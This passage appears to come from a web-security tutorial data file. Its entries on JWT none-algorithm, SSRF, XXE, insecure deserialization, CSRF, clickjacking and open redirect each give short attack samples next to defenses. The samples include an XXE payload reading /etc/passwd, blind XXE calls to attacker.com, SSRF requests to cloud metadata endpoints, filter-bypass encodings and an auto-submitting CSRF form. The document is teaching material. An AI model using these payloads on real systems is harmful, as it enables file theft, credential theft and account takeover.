        <h3>Manual JWT Modification Example:</h3>

        <pre><code>{
  "user":"victim",
  "role":"admin"
}</code></pre>

        <p>The attacker changes authorization data inside the JWT payload.</p>

        <h3>Testing Using jwt_tool:</h3>

        <pre><code>python3 jwt_tool.py TOKEN -X n</code></pre>

        <p>The tool attempts exploitation using the none algorithm technique.</p>

        <h3>Safe JWT Validation Example:</h3>

        <pre><code>// Secure JWT Validation

Reject alg:none

Verify signatures

Restrict accepted algorithms

Validate token claims</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Completely disable the none algorithm.</b></p>

        <p><b>2. Always validate JWT signatures.</b></p>

        <p><b>3. Restrict accepted algorithms explicitly.</b></p>

        <p><b>4. Use trusted JWT libraries.</b></p>

        <p><b>5. Never trust user-controlled JWT headers.</b></p>

        <p><b>6. Validate token claims and expiration.</b></p>

        <p><b>7. Regularly update JWT libraries.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Apply strict JWT validation

Use strong secret keys

Enable API security monitoring

Apply access logging

Use HTTPS for token transmission</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
jwt_tool
OWASP ZAP
Nuclei
Postman</code></pre>

        <h3>Difference Between JWT Manipulation and None Algorithm Exploit:</h3>

        <p><b>JWT Manipulation:</b> Includes multiple JWT-related weaknesses.</p>

        <p><b>None Algorithm Exploit:</b> Specifically abuses acceptance of unsigned JWT tokens.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may bypass authentication entirely, impersonate administrators, access sensitive APIs, compromise cloud services, or fully take over vulnerable applications.</p>

        <h3>Vulnerability Severity:</h3>

        <p>JWT None Algorithm vulnerabilities are considered extremely critical because improper signature validation may completely break authentication security.</p>
    `
},


{
    "id": 26,
    "title": "Server Side Request Forgery (SSRF)",
    "summary": `
        <p><b>Server Side Request Forgery (SSRF)</b> is a critical web vulnerability that allows attackers to force a server to send unauthorized requests to internal or external systems.</p>

        <p>This vulnerability occurs when a web application fetches remote resources based on user-controlled input without proper validation or restrictions.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the server accepts URLs or network locations from users and performs requests on their behalf.</p>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>http://target.com/fetch?url=http://example.com</code></pre>

        <p>The application fetches the supplied URL without validating its destination.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/fetch?url=http://127.0.0.1/admin</code></pre>

        <p>The attacker forces the server to access internal services that are normally inaccessible externally.</p>

        <h3>Why is SSRF Dangerous?</h3>

        <p>Successful exploitation may allow attackers to access internal systems, cloud metadata services, private APIs, administrative panels, or sensitive network resources.</p>

        <h3>Common SSRF Targets:</h3>

        <pre><code>127.0.0.1

localhost

Internal APIs

Cloud metadata services

Private network services</code></pre>

        <h3>Accessing Local Services Example:</h3>

        <pre><code>http://127.0.0.1:8080</code></pre>

        <p>The attacker attempts to interact with services running on the local server.</p>

        <h3>Cloud Metadata SSRF Example:</h3>

        <pre><code>http://169.254.169.254/latest/meta-data/</code></pre>

        <p>Attackers target cloud metadata endpoints to steal credentials or tokens.</p>

        <h3>SSRF Against Internal APIs:</h3>

        <pre><code>http://internal-api/admin/users</code></pre>

        <p>The server accesses internal APIs that are hidden from external users.</p>

        <h3>Blind SSRF:</h3>

        <p>Sometimes the attacker cannot directly view the server response.</p>

        <pre><code>http://attacker.com/log</code></pre>

        <p>The attacker monitors external interactions to confirm exploitation.</p>

        <h3>Out-of-Band SSRF:</h3>

        <p>The vulnerable server sends requests to attacker-controlled infrastructure.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Image fetchers

Webhook integrations

PDF generators

URL preview systems

Import functionality</code></pre>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /fetch?url=http://127.0.0.1 HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>SSRF Port Scanning Example:</h3>

        <pre><code>http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379</code></pre>

        <p>Attackers probe internal ports and services through the vulnerable server.</p>

        <h3>Bypassing SSRF Filters:</h3>

        <pre><code>127.0.0.1
localhost
0.0.0.0
2130706433</code></pre>

        <p>Attackers may use alternative IP representations to bypass weak filters.</p>

        <h3>URL Redirection Abuse:</h3>

        <p>Attackers may abuse open redirects to bypass URL validation mechanisms.</p>

        <h3>Indicators of SSRF Vulnerabilities:</h3>

        <p>1. User-controlled URL fetching.</p>
        <p>2. Internal network interactions.</p>
        <p>3. Server-side HTTP requests.</p>
        <p>4. External callbacks from the server.</p>
        <p>5. Weak URL validation logic.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Accessing internal services.</p>
        <p>2. Cloud credential theft.</p>
        <p>3. Internal network scanning.</p>
        <p>4. Administrative access.</p>
        <p>5. Remote Code Execution in chained attacks.</p>

        <h3>Example of Vulnerable Backend Logic:</h3>

        <pre><code>// Vulnerable Example

url = request.GET['url']

response = requests.get(url)</code></pre>

        <p>The application performs requests directly using user-controlled URLs.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Allow only trusted domains

Block internal IP ranges

Validate URLs strictly</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Restrict outgoing server requests.</b></p>

        <p><b>2. Allow only trusted domains.</b></p>

        <p><b>3. Block internal IP addresses and localhost.</b></p>

        <p><b>4. Disable unnecessary network access.</b></p>

        <p><b>5. Validate and sanitize user-supplied URLs.</b></p>

        <p><b>6. Apply network segmentation.</b></p>

        <p><b>7. Monitor unusual outbound traffic.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict cloud metadata access

Apply firewall rules

Use DNS filtering

Monitor outbound connections

Disable unused services</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
SSRFmap
Nuclei
Interactsh</code></pre>

        <h3>Difference Between SSRF and XXE:</h3>

        <p><b>SSRF:</b> Forces the server to send arbitrary requests.</p>

        <p><b>XXE:</b> Exploits XML parsers to access files or internal resources.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may compromise cloud environments, access internal administrative systems, steal credentials, scan private networks, or chain SSRF with other vulnerabilities to achieve Remote Code Execution.</p>

        <h3>Vulnerability Severity:</h3>

        <p>SSRF vulnerabilities are considered extremely critical because vulnerable servers may become gateways into otherwise inaccessible internal infrastructure.</p>
    `
},


{
    "id": 27,
    "title": "XML External Entity (XXE)",
    "summary": `
        <p><b>XML External Entity (XXE)</b> is a critical vulnerability that occurs when an application processes untrusted XML input with insecure XML parsers that allow external entity processing.</p>

        <p>This vulnerability allows attackers to read local files, access internal services, perform Server Side Request Forgery (SSRF), cause Denial of Service (DoS), or potentially achieve Remote Code Execution in chained attacks.</p>

        <h3>What is XML?</h3>

        <p>XML stands for <b>eXtensible Markup Language</b>, which is commonly used for data exchange between systems and applications.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when XML parsers allow external entities or external DTD processing without proper restrictions.</p>

        <h3>Basic XML Example:</h3>

        <pre><code>&lt;user&gt;
    &lt;name&gt;admin&lt;/name&gt;
&lt;/user&gt;</code></pre>

        <h3>What are XML Entities?</h3>

        <p>Entities are variables used inside XML documents.</p>

        <pre><code>&lt;!ENTITY company "Example"&gt;</code></pre>

        <h3>Dangerous External Entity Example:</h3>

        <pre><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code></pre>

        <p>The parser attempts to read a local file from the server.</p>

        <h3>Basic XXE Exploitation Example:</h3>

        <pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;

&lt;user&gt;
    &lt;name&gt;&xxe;&lt;/name&gt;
&lt;/user&gt;</code></pre>

        <p>The XML parser replaces the entity with the contents of the targeted file.</p>

        <h3>Why is XXE Dangerous?</h3>

        <p>Successful exploitation may allow attackers to read sensitive files, access internal systems, perform SSRF attacks, or compromise backend infrastructure.</p>

        <h3>Common Sensitive File Targets:</h3>

        <pre><code>/etc/passwd

/etc/shadow

C:\\Windows\\win.ini

Application configuration files</code></pre>

        <h3>XXE SSRF Example:</h3>

        <pre><code>&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8080"&gt;</code></pre>

        <p>The server performs requests to internal services through the XML parser.</p>

        <h3>Blind XXE:</h3>

        <p>Sometimes attackers cannot directly view the server response.</p>

        <pre><code>&lt;!ENTITY xxe SYSTEM "http://attacker.com/log"&gt;</code></pre>

        <p>The attacker monitors external callbacks to confirm exploitation.</p>

        <h3>Out-of-Band XXE Example:</h3>

        <pre><code>&lt;!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd"&gt;</code></pre>

        <p>The parser loads attacker-controlled external DTD files.</p>

        <h3>Billion Laughs DoS Attack:</h3>

        <pre><code>&lt;!ENTITY a "LOL"&gt;
&lt;!ENTITY b "&a;&a;&a;&a;&a;"&gt;</code></pre>

        <p>Nested entity expansion may exhaust server memory and resources.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>SOAP APIs

XML file uploads

Document parsers

SSO systems

Web services</code></pre>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /api/xml HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/xml</code></pre>

        <h3>Indicators of XXE Vulnerabilities:</h3>

        <p>1. XML input accepted by the application.</p>
        <p>2. XML parsers with external entity support enabled.</p>
        <p>3. File disclosure through XML entities.</p>
        <p>4. Server-side requests triggered by XML input.</p>
        <p>5. Outbound DNS or HTTP callbacks.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Reading sensitive files.</p>
        <p>2. SSRF attacks.</p>
        <p>3. Internal network access.</p>
        <p>4. Credential theft.</p>
        <p>5. Denial of Service.</p>

        <h3>Example of Vulnerable Backend Logic:</h3>

        <pre><code>// Vulnerable XML Parser

DocumentBuilderFactory factory =
DocumentBuilderFactory.newInstance();

factory.setExpandEntityReferences(true);</code></pre>

        <p>The parser allows external entity processing.</p>

        <h3>Safe XML Parser Example:</h3>

        <pre><code>// Secure Configuration

Disable DTD processing

Disable external entities

Use secure parser settings</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Disable external entity processing.</b></p>

        <p><b>2. Disable DTD support when unnecessary.</b></p>

        <p><b>3. Use secure XML parser configurations.</b></p>

        <p><b>4. Validate and sanitize XML input.</b></p>

        <p><b>5. Restrict server outbound network access.</b></p>

        <p><b>6. Apply least privilege permissions.</b></p>

        <p><b>7. Monitor suspicious XML parsing activity.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict file system access

Apply network segmentation

Disable unnecessary XML services

Monitor outbound traffic

Use Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
XXEinjector
Nuclei
Metasploit</code></pre>

        <h3>Difference Between XXE and SSRF:</h3>

        <p><b>XXE:</b> Exploits insecure XML parsers.</p>

        <p><b>SSRF:</b> Exploits arbitrary server-side request functionality.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may steal sensitive files, compromise cloud services, access internal networks, expose credentials, disrupt services, or combine XXE with other vulnerabilities to achieve full system compromise.</p>

        <h3>Vulnerability Severity:</h3>

        <p>XXE vulnerabilities are considered extremely critical because insecure XML processing may expose sensitive systems, internal networks, and confidential server data.</p>
    `
},


{
    "id": 28,
    "title": "Insecure Deserialization Attack",
    "summary": `
        <p><b>Insecure Deserialization</b> is a critical vulnerability that occurs when applications deserialize untrusted or user-controlled data without proper validation or security controls.</p>

        <p>This vulnerability may allow attackers to manipulate application logic, execute arbitrary code, escalate privileges, or completely compromise servers and applications.</p>

        <h3>What is Serialization?</h3>

        <p>Serialization is the process of converting objects or data structures into a format that can be stored or transmitted.</p>

        <h3>What is Deserialization?</h3>

        <p>Deserialization is the process of converting serialized data back into application objects.</p>

        <h3>Common Serialization Formats:</h3>

        <pre><code>JSON

XML

PHP Serialization

Java Serialization

Python Pickle</code></pre>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when applications trust serialized data coming from users without verifying its integrity or content.</p>

        <h3>PHP Serialization Example:</h3>

        <pre><code>O:4:"User":2:{
s:4:"name";
s:5:"admin";
}</code></pre>

        <p>The serialized object contains application data that may be modified by attackers.</p>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>$data = unserialize($_COOKIE['user']);</code></pre>

        <p>The application deserializes user-controlled cookie data directly.</p>

        <h3>Why is Insecure Deserialization Dangerous?</h3>

        <p>Successful exploitation may allow attackers to achieve Remote Code Execution, authentication bypass, privilege escalation, or data manipulation.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote Code Execution.</p>
        <p>2. Authentication bypass.</p>
        <p>3. Privilege escalation.</p>
        <p>4. File manipulation.</p>
        <p>5. Application compromise.</p>

        <h3>Java Deserialization Example:</h3>

        <pre><code>ObjectInputStream.readObject()</code></pre>

        <p>Unsafe Java deserialization may trigger malicious gadget chains.</p>

        <h3>Python Pickle Example:</h3>

        <pre><code>pickle.loads(user_input)</code></pre>

        <p>Attackers may execute arbitrary Python code during deserialization.</p>

        <h3>Malicious Serialized Payload Example:</h3>

        <pre><code>O:8:"Exploit":1:{
s:4:"cmd";
s:2:"id";
}</code></pre>

        <p>The attacker injects malicious object properties into the serialized payload.</p>

        <h3>Remote Code Execution Scenario:</h3>

        <pre><code>Runtime.getRuntime().exec("calc.exe")</code></pre>

        <p>Malicious gadget chains may execute operating system commands.</p>

        <h3>Cookie Manipulation Example:</h3>

        <pre><code>Cookie: user=serialized_data</code></pre>

        <p>Attackers tamper with serialized session or user objects.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /profile HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>The attacker intercepts and modifies serialized data before sending it to the server.</p>

        <h3>Indicators of Insecure Deserialization:</h3>

        <p>1. Serialized objects stored in cookies or requests.</p>
        <p>2. Use of unsafe deserialization functions.</p>
        <p>3. Base64 encoded serialized objects.</p>
        <p>4. Unexpected object execution behavior.</p>
        <p>5. Application crashes during object parsing.</p>

        <h3>Common Vulnerable Technologies:</h3>

        <pre><code>PHP unserialize()

Java readObject()

Python pickle

.NET BinaryFormatter

Ruby Marshal</code></pre>

        <h3>Base64 Encoded Payload Example:</h3>

        <pre><code>Tzo0OiJVc2VyIjoyOnt9</code></pre>

        <p>Serialized payloads are often encoded before transmission.</p>

        <h3>Common Attack Chains:</h3>

        <pre><code>Deserialization + RCE

Deserialization + File Write

Deserialization + Privilege Escalation

Deserialization + Authentication Bypass</code></pre>

        <h3>Safe Implementation Example:</h3>

        <pre><code>// Secure Example

Avoid deserializing untrusted input

Use signed tokens

Validate object types</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Avoid deserializing untrusted data.</b></p>

        <p><b>2. Use safer data formats such as JSON.</b></p>

        <p><b>3. Validate object integrity using digital signatures.</b></p>

        <p><b>4. Restrict allowed object types.</b></p>

        <p><b>5. Disable dangerous deserialization features.</b></p>

        <p><b>6. Keep libraries and frameworks updated.</b></p>

        <p><b>7. Monitor suspicious object parsing behavior.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Apply least privilege permissions

Restrict dangerous classes

Monitor runtime execution

Use application sandboxing

Enable security logging</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
ysoserial
OWASP ZAP
Nuclei
SerialKiller</code></pre>

        <h3>Difference Between Serialization and Encoding:</h3>

        <p><b>Serialization:</b> Converts objects into transferable formats.</p>

        <p><b>Encoding:</b> Transforms data representation without object reconstruction.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may execute arbitrary code, compromise servers, bypass authentication systems, manipulate application data, or fully take over backend infrastructure.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Insecure Deserialization vulnerabilities are considered extremely critical because unsafe object parsing may directly lead to Remote Code Execution and complete application compromise.</p>
    `
},


{
    "id": 29,
    "title": "CSRF Account Takeover",
    "summary": `
        <p><b>CSRF Account Takeover</b> is a critical attack that abuses Cross Site Request Forgery (CSRF) vulnerabilities to perform unauthorized account actions on behalf of authenticated victims.</p>

        <p>This attack occurs when a vulnerable web application accepts sensitive requests without properly verifying whether the request was intentionally initiated by the authenticated user.</p>

        <h3>What is CSRF?</h3>

        <p>CSRF stands for <b>Cross Site Request Forgery</b>, a vulnerability that forces authenticated users to execute unwanted actions within a web application.</p>

        <h3>How Does the Attack Occur?</h3>

        <p>The attack occurs when the victim is already authenticated to the target application and visits an attacker-controlled page.</p>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>POST /change-email HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>The application processes sensitive requests without CSRF protection.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>&lt;form action="http://target.com/change-email" method="POST"&gt;
    &lt;input type="hidden" name="email" value="attacker@email.com"&gt;
&lt;/form&gt;

&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;</code></pre>

        <p>The victim's browser automatically sends the authenticated request to the target application.</p>

        <h3>Why is CSRF Dangerous?</h3>

        <p>Successful exploitation may allow attackers to modify account settings, change passwords, transfer funds, or completely take over victim accounts.</p>

        <h3>Account Takeover Scenario:</h3>

        <pre><code>POST /change-password HTTP/1.1</code></pre>

        <p>The attacker tricks the victim into submitting a password change request.</p>

        <h3>Email Change Attack:</h3>

        <pre><code>email=attacker@evil.com</code></pre>

        <p>The attacker changes the victim's recovery email address.</p>

        <h3>Password Reset Abuse:</h3>

        <pre><code>password=hacked123</code></pre>

        <p>The attacker forces the victim to set a password controlled by the attacker.</p>

        <h3>Why Authentication Alone is Not Enough?</h3>

        <p>The victim's browser automatically includes session cookies with requests, making the forged request appear legitimate.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Account takeover.</p>
        <p>2. Password changes.</p>
        <p>3. Email modification.</p>
        <p>4. Financial transactions.</p>
        <p>5. Administrative actions.</p>

        <h3>GET-Based CSRF Example:</h3>

        <pre><code>&lt;img src="http://target.com/delete-account"&gt;</code></pre>

        <p>The browser automatically triggers the request when loading the image.</p>

        <h3>CSRF Using Hidden Forms:</h3>

        <pre><code>&lt;iframe style="display:none"&gt;&lt;/iframe&gt;</code></pre>

        <p>Attackers often hide malicious requests inside invisible elements.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /change-password HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>The attacker captures and reproduces authenticated requests.</p>

        <h3>Indicators of CSRF Vulnerabilities:</h3>

        <p>1. Missing CSRF tokens.</p>
        <p>2. Sensitive actions allowed via GET requests.</p>
        <p>3. No origin or referer validation.</p>
        <p>4. Session cookies automatically accepted.</p>
        <p>5. State-changing actions without user confirmation.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Password change forms

Email update systems

Bank transfer functionality

Administrative panels

Account settings pages</code></pre>

        <h3>Weak Protection Example:</h3>

        <pre><code>if(user.isAuthenticated()) {
    processRequest();
}</code></pre>

        <p>The application checks authentication only and ignores request origin validation.</p>

        <h3>Safe CSRF Protection Example:</h3>

        <pre><code>// Secure Example

Generate CSRF tokens

Validate token per request

Verify Origin headers

Require user confirmation</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Implement CSRF tokens for sensitive actions.</b></p>

        <p><b>2. Validate Origin and Referer headers.</b></p>

        <p><b>3. Use SameSite cookie protection.</b></p>

        <p><b>4. Avoid sensitive actions through GET requests.</b></p>

        <p><b>5. Require password confirmation for critical actions.</b></p>

        <p><b>6. Use Multi-Factor Authentication (MFA).</b></p>

        <p><b>7. Monitor suspicious account activity.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable SameSite cookies

Apply anti-CSRF middleware

Use secure session management

Monitor account changes

Apply security logging</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nuclei
Postman
CSRF PoC Generator</code></pre>

        <h3>Difference Between XSS and CSRF:</h3>

        <p><b>XSS:</b> Executes malicious JavaScript inside the victim's browser.</p>

        <p><b>CSRF:</b> Forces authenticated victims to perform unintended requests.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may completely take over user accounts, modify security settings, steal sensitive information, perform unauthorized financial actions, or compromise administrative accounts.</p>

        <h3>Vulnerability Severity:</h3>

        <p>CSRF Account Takeover vulnerabilities are considered extremely critical because attackers may abuse authenticated user sessions to gain unauthorized control over victim accounts.</p>
    `
},


{
    "id": 30,
    "title": "Clickjacking Attack",
    "summary": `
        <p><b>Clickjacking</b> is a dangerous user interface attack that tricks victims into clicking hidden or disguised elements on a web page without their knowledge.</p>

        <p>This attack occurs when attackers load a legitimate website inside invisible or transparent frames and manipulate the victim into interacting with unintended buttons or actions.</p>

        <h3>How Does the Attack Occur?</h3>

        <p>The attacker embeds a vulnerable website inside an iframe and overlays malicious content to deceive the victim.</p>

        <h3>Basic Clickjacking Example:</h3>

        <pre><code>&lt;iframe src="http://target.com" 
style="opacity:0;position:absolute;"&gt;
&lt;/iframe&gt;</code></pre>

        <p>The legitimate page becomes invisible while remaining clickable.</p>

        <h3>Why is Clickjacking Dangerous?</h3>

        <p>Victims may unknowingly perform sensitive actions such as changing passwords, enabling settings, transferring funds, or granting permissions.</p>

        <h3>Invisible Button Trick:</h3>

        <pre><code>&lt;button&gt;Claim Prize&lt;/button&gt;</code></pre>

        <p>The visible button hides a sensitive action underneath from the target website.</p>

        <h3>Example Attack Scenario:</h3>

        <p>The attacker places a fake "Play Video" button over a hidden administrative confirmation button.</p>

        <h3>Social Engineering Element:</h3>

        <p>Clickjacking often relies on deceptive user interface design and psychological manipulation.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Account takeover.</p>
        <p>2. Password changes.</p>
        <p>3. Unauthorized purchases.</p>
        <p>4. Permission abuse.</p>
        <p>5. Social media interactions.</p>

        <h3>Likejacking Example:</h3>

        <p>Attackers trick users into liking or sharing social media content unknowingly.</p>

        <h3>File Upload Clickjacking:</h3>

        <p>Attackers may force victims to upload sensitive files accidentally.</p>

        <h3>Transparent Overlay Example:</h3>

        <pre><code>opacity:0;
z-index:9999;
position:absolute;</code></pre>

        <p>Attackers use CSS styling to hide legitimate web elements.</p>

        <h3>Cursor Manipulation Technique:</h3>

        <p>The attacker aligns clickable areas precisely beneath the victim's cursor.</p>

        <h3>Example Using iframe:</h3>

        <pre><code>&lt;iframe src="http://target.com/settings"&gt;
&lt;/iframe&gt;</code></pre>

        <p>The victim interacts with hidden account settings unknowingly.</p>

        <h3>Indicators of Clickjacking Vulnerabilities:</h3>

        <p>1. Pages allowed inside iframes.</p>
        <p>2. Missing X-Frame-Options header.</p>
        <p>3. Missing Content Security Policy frame restrictions.</p>
        <p>4. Sensitive actions requiring only a single click.</p>
        <p>5. No user interaction validation.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Administrative panels

Payment systems

Social media platforms

Account settings

Cloud dashboards</code></pre>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /settings HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>The tester checks whether the page can be embedded inside an iframe.</p>

        <h3>Frame Busting JavaScript:</h3>

        <pre><code>if(top !== self) {
    top.location = self.location;
}</code></pre>

        <p>Some applications attempt to prevent iframe embedding using JavaScript.</p>

        <h3>Weak Protection Example:</h3>

        <pre><code>// Missing Security Headers

No X-Frame-Options

No CSP frame-ancestors</code></pre>

        <p>The application allows unrestricted framing by external websites.</p>

        <h3>Safe Protection Example:</h3>

        <pre><code>X-Frame-Options: DENY

Content-Security-Policy:
frame-ancestors 'none';</code></pre>

        <p>The application blocks iframe embedding completely.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use the X-Frame-Options header.</b></p>

        <p><b>2. Apply Content Security Policy frame restrictions.</b></p>

        <p><b>3. Prevent sensitive actions with single-click operations.</b></p>

        <p><b>4. Require user confirmations for critical actions.</b></p>

        <p><b>5. Use Multi-Factor Authentication (MFA).</b></p>

        <p><b>6. Apply frame busting protections.</b></p>

        <p><b>7. Monitor suspicious user behavior.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable X-Frame-Options

Use CSP frame-ancestors

Restrict embedded content

Apply session protections

Enable security monitoring</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nuclei
Clickbandit
Browser Developer Tools</code></pre>

        <h3>Difference Between Clickjacking and CSRF:</h3>

        <p><b>Clickjacking:</b> Tricks users into clicking hidden elements.</p>

        <p><b>CSRF:</b> Forces browsers to send unauthorized requests automatically.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may manipulate victims into changing security settings, authorizing transactions, granting application permissions, or unintentionally exposing sensitive information.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Clickjacking vulnerabilities are considered highly dangerous because attackers may abuse trusted user interactions to perform unauthorized actions invisibly.</p>
    `
},


{
    "id": 31,
    "title": "Open Redirect Vulnerability",
    "summary": `
        <p><b>Open Redirect</b> is a web vulnerability that occurs when an application redirects users to external URLs without properly validating or restricting the destination.</p>

        <p>This vulnerability allows attackers to craft malicious links that appear trustworthy because they use the legitimate domain of the vulnerable application.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when user-controlled input determines the redirect destination without proper validation.</p>

        <h3>Basic Vulnerable Example:</h3>

        <pre><code>http://target.com/redirect?url=http://evil.com</code></pre>

        <p>The application redirects the user directly to the supplied external URL.</p>

        <h3>Simple Vulnerable Backend Logic:</h3>

        <pre><code>// Vulnerable Example

redirect(request.GET['url'])</code></pre>

        <p>The application trusts the user-controlled redirect parameter completely.</p>

        <h3>Why is Open Redirect Dangerous?</h3>

        <p>Attackers may abuse trusted domains to perform phishing attacks, credential theft, malware distribution, or bypass security protections.</p>

        <h3>Phishing Attack Example:</h3>

        <pre><code>http://target.com/redirect?url=http://fake-login.com</code></pre>

        <p>The victim believes the link is legitimate because it starts with the trusted domain.</p>

        <h3>Credential Theft Scenario:</h3>

        <p>The victim is redirected to a fake login page designed to steal usernames and passwords.</p>

        <h3>Malware Delivery Example:</h3>

        <p>Attackers redirect users to malicious downloads or exploit kits.</p>

        <h3>Bypassing Security Filters:</h3>

        <p>Open redirects may help attackers bypass URL filtering systems or security allowlists.</p>

        <h3>OAuth Abuse Example:</h3>

        <pre><code>redirect_uri=http://evil.com</code></pre>

        <p>Improper redirect validation in OAuth implementations may expose authorization tokens.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Phishing attacks.</p>
        <p>2. Credential theft.</p>
        <p>3. Malware distribution.</p>
        <p>4. Token theft.</p>
        <p>5. Social engineering attacks.</p>

        <h3>JavaScript Redirect Example:</h3>

        <pre><code>window.location = userInput;</code></pre>

        <p>Client-side redirects may also become vulnerable if user input is not validated.</p>

        <h3>Meta Refresh Redirect Example:</h3>

        <pre><code>&lt;meta http-equiv="refresh"
content="0;url=http://evil.com"&gt;</code></pre>

        <p>Attackers may abuse HTML redirects as part of redirect chains.</p>

        <h3>Filter Bypass Techniques:</h3>

        <pre><code>//evil.com
https://evil.com
http://trusted.com.evil.com</code></pre>

        <p>Attackers use alternative URL formats to bypass weak validation logic.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /redirect?url=http://evil.com HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Indicators of Open Redirect Vulnerabilities:</h3>

        <p>1. User-controlled redirect parameters.</p>
        <p>2. External redirects without validation.</p>
        <p>3. OAuth redirect weaknesses.</p>
        <p>4. URL parameters named redirect, url, next, or return.</p>
        <p>5. Client-side redirect logic.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Login systems

Password reset flows

OAuth integrations

Payment systems

Redirect pages</code></pre>

        <h3>Unsafe Redirect Example:</h3>

        <pre><code>response.sendRedirect(userInput)</code></pre>

        <p>The application redirects users using untrusted input directly.</p>

        <h3>Safe Redirect Example:</h3>

        <pre><code>// Secure Example

Allow only internal paths

Validate trusted domains

Use redirect allowlists</code></pre>

        <p>The application validates redirect destinations before processing requests.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Allow redirects only to trusted domains.</b></p>

        <p><b>2. Use strict allowlists for redirect destinations.</b></p>

        <p><b>3. Avoid user-controlled external redirects.</b></p>

        <p><b>4. Validate and sanitize redirect parameters.</b></p>

        <p><b>5. Use indirect reference mappings for redirects.</b></p>

        <p><b>6. Restrict OAuth redirect URIs carefully.</b></p>

        <p><b>7. Monitor suspicious redirect activity.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Apply URL validation

Restrict external redirects

Enable security logging

Monitor phishing attempts

Apply OAuth security controls</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nuclei
ParamSpider
Postman</code></pre>

        <h3>Difference Between Open Redirect and SSRF:</h3>

        <p><b>Open Redirect:</b> Redirects victim browsers to attacker-controlled destinations.</p>

        <p><b>SSRF:</b> Forces the server itself to send requests to arbitrary locations.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may steal credentials, deliver malware, abuse OAuth integrations, conduct phishing campaigns, or exploit trusted domains to deceive victims.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Open Redirect vulnerabilities are considered dangerous because trusted domains may be abused to facilitate phishing, token theft, and social engineering attacks.</p>
    `
},


{
    "id": 32,
    "title": "HTTP Host Header Injection",
    "summary": `
        <p><b>HTTP Host Header Injection</b> is a dangerous web vulnerability that occurs when applications trust and process the HTTP Host header without proper validation.</p>

        <p>This vulnerability may allow attackers to manipulate application behavior, poison caches, perform password reset poisoning, bypass security controls, or conduct phishing attacks.</p>

